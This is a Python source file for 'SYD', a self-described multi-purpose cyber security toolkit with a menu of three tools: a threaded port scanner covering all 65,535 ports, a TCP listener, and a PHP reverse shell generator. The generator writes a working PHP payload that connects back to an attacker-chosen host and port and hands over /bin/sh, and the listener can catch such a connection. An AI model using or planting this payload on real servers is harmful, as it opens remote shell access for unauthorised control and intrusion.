from termcolor import colored
import socket
import threading
import time
import subprocess
import re  # re modülünü import ettim

def print_syd_logo():
    logo = [
        "░▒▓███████▓▒ ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        " ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓███████▓▒░  "
    ]
    for line in logo:
        print(colored(line, 'cyan', attrs=['bold']))
        time.sleep(0.1)

def print_welcome_message():
    print(colored("\nWelcome to SYD - Multi-Purpose Cyber Security Tool Kit", 'green', attrs=['bold']))
    print(colored("Developed by SydRa aka Sacit \n", 'yellow'))

def validate_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        return ip
    print(colored("[!] Invalid IP Address! Try Again.", "red"))
    return validate_ip(input(colored("Target IP Address: ", "cyan")))

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
    except ValueError:
        pass
    print(colored("[!] Invalid Port! Try Again.", "red"))
    return validate_port(input(colored("Enter Port (1-65535): ", "cyan")))

def scan_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    conn = s.connect_ex((ip, port))
    if conn == 0:
        print(colored(f"[+] {ip}:{port} Open", "green"))
    s.close()

def port_scanner(ip):
    print(colored(f"\nScanning... {ip} (1-65535)\n", "yellow"))
    try:
        for port in range(1, 65536):
            thread = threading.Thread(target=scan_port, args=(ip, port))
            thread.start()
    except KeyboardInterrupt:
        print(colored("\nTarama işlemi iptal edildi! Ana menüye dönülüyor...\n", "red"))
        main_menu()

def port_listener():
    host = "0.0.0.0"
    port = int(input(colored("Which Port You Want To Listen? (1-65536) : ", "cyan")))
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    
    print(colored(f"\n[+] Port {port} dinleniyor. Bağlantı bekleniyor...", "yellow"))
    try:
        client_socket, client_address = server.accept()
        print(colored(f"\n[+] Connection Confirmed: {client_address[0]}:{client_address[1]}", "green"))
        
        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(colored(f"[CLIENT]: {data}", "cyan"))
            message = input(colored("[YOU]: ", "magenta"))
            client_socket.send(message.encode())
    except KeyboardInterrupt:
        print(colored("\n[!] Returning to the Menu...", "red"))
    finally:
        server.close()

def generate_php_reverse_shell():
    lhost = input(colored("Enter Your Attack Ip Address (LHOST): ", "cyan"))
    lport = input(colored("Enter Your Attack Port (LPORT): ", "cyan"))

    try:
        php_shell = f'''<?php
        $sock = fsockopen("{lhost}", {lport});
        $proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        ?>'''

        with open("reverse_shell.php", "w") as file:
            file.write(php_shell)
        
        print(colored("[+] PHP Reverse Shell file created as 'reverse_shell.php' on your Desktop "))
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))
        generate_php_reverse_shell()

def main_menu():
    while True:
        print(colored("\n[ SYD - Cyber Security Tools ]", "cyan", attrs=["bold"]))
        print(colored("1 - Port Scanner (Basic)", "yellow"))
        print(colored("2 - TCP Port Listener (Basic)", "yellow"))
        print(colored("3 - PHP Reverse Shell Generator (Alpha 0.1)", "yellow"))
        print(colored("0 - Exit", "red"))
        
        choice = input(colored("\nSelect a Tool: ", "cyan"))
        if choice == "0":
            print(colored("[!] Returning to the Menu...", "red"))
            break
        elif choice == "1":
            target_ip = input(colored("Target IP Address: ", "cyan"))
            port_scanner(target_ip)
        elif choice == "2":
            port_listener()
        elif choice == "3":
            generate_php_reverse_shell()
        else:
            print(colored("[!] Invalid selection! Try Again.", "red"))

if __name__ == "__main__":
    print_syd_logo()
    print_welcome_message()
    main_menu()
